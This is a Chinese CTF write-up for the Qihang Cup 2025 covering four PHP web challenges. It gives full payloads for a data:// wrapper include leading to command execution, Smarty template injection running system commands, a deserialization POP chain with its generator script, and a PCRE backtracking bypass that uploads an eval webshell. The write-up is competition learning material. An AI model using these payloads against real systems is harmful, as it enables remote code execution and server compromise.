+++
title = "启航杯2025"
slug = "qihang-cup-2025"
description = "垃圾题"
date = "2025-01-25T20:24:25"
lastmod = "2025-01-25T20:24:25"
image = ""
license = ""
categories = []
tags = []
+++

## Easy_include

```php
<?php
error_reporting(0);
//flag in flag.php
$file=$_GET['file'];
if(isset($file))
{
    if(!preg_match("/flag/i",$file))
    {
        include($file);
    }
    else
    {
        echo("no no no ~ ");
    }
}
else
{
    highlight_file(__FILE__);
}

?>
```

```
http://challenge.qihangcup.cn:33039/?file=data://text/plain;base64,PD89ZXZhbCgkX0dFVFthXSk7Pz4=&a=system("tac flag.php");
```

## Web_IP

smarty注入

```
{$smarty.version}

{if system('ls /')}{/if}

{if system('cat /flag')}{/if}
```

## ez_pop

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class Start{
    public $name;
    protected $func;
 
    public function __destruct()
    {
        echo "Welcome to QHCTF 2025, ".$this->name;
    }
 
    public function __isset($var)
    {
        ($this->func)();
    }
}
 
class Sec{
    private $obj;
    private $var;
 
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
 
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
 
class Easy{
    public $cla;
 
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
 
class eeee{
    public $obj;
 
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
 
if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

```php
<?php
class Start{
    public $name;
    public $func;
}

class Sec{
    public $obj;
    public $var;
}

class Easy{
    public $cla;
}

class eeee{
    public $obj;
}
$a=new Start();
$a->name=new Sec();
$a->name->var=new eeee();
$a->name->obj=new Easy();
$a->name->var->obj=new Start();
$a->name->var->obj->func=new Sec();
echo serialize($a);
```

主要的点就是`clone`，当被显式`clone`的时候，就可以直接的去触发了，所以var要设置为`eeee`

## PCREMagic

```php
<?php
function is_php($data){
     return preg_match('/<\?php.*?eval.*?\(.*?\).*?\?>/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    if (!is_dir($user_dir)) {
        mkdir($user_dir, 0755, true);
    }
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
    exit;
}
?> 1
```

```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[1]);//' + b'a' * 1000000)
}

res = requests.post('http://challenge.qihangcup.cn:33516/', files=files, allow_redirects=False)
print(res.headers)
```

## 小结

就那样吧，不评价，至少说明了我们蜀道山还是办的可以
